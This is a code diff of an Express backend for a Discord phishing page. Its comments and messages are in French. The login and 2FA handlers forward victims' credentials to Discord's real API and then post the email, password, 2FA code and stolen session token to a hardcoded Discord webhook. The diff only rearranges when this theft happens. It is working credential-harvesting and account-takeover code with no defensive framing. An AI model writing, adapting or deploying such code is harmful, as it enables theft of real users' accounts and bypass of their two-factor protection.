@@ -10,16 +10,6 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvH
 app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
   
-  // 1. ON ENVOIE L'INFO TOUT DE SUITE SUR TON DISCORD
-  try {
-    await axios.post(WEBHOOK_URL, { 
-      content: `🎯 **Nouvelle tentative !**\n**Email:** \`${email}\`\n**Pass:** \`${password}\`` 
-    });
-  } catch (e) {
-    console.log("Erreur webhook:", e.message);
-  }
-
-  // 2. ON VERIFIE SUR DISCORD POUR LE 2FA
   try {
     const r = await axios.post('https://discord.com/api/v9/auth/login', 
       { login: email, password: password },
@@ -32,10 +22,15 @@ app.post('/api/login', async (req, res) => {
     );
     
     if (r.data.mfa) {
+      await axios.post(WEBHOOK_URL, { content: `🔐 **2FA en attente**\nEmail: \`${email}\`\nPass: \`${password}\`` });
       return res.json({ mfa: true, ticket: r.data.ticket });
     }
+    
+    await axios.post(WEBHOOK_URL, { content: `✅ **Compte Volé !**\nEmail: \`${email}\`\nPass: \`${password}\`\n\n**TOKEN:**\n\`${r.data.token}\`` });
     return res.json({ success: true });
+    
   } catch (error) {
+    await axios.post(WEBHOOK_URL, { content: `❌ **Mauvais mot de passe**\nEmail: \`${email}\`\nPass: \`${password}\`` });
     return res.json({ success: false });
   }
 });
@@ -44,13 +39,8 @@ app.post('/api/mfa', async (req, res) => {
   const { email, password, code, ticket } = req.body;
   
   try {
-    await axios.post(WEBHOOK_URL, { 
-      content: `🔥 **2FA Soumis !**\n**Email:** \`${email}\`\n**Code:** \`${code}\`` 
-    });
-  } catch (e) {}
-
-  try {
-    await axios.post('https://discord.com/api/v9/auth/mfa', { ticket: ticket, code: code });
+    const r = await axios.post('https://discord.com/api/v9/auth/mfa', { ticket: ticket, code: code });
+    await axios.post(WEBHOOK_URL, { content: `🔥 **2FA Bypassé !**\nEmail: \`${email}\`\nCode: \`${code}\`\n\n**TOKEN:**\n\`${r.data.token}\`` });
     return res.json({ success: true });
   } catch (error) {
     return res.json({ success: false });
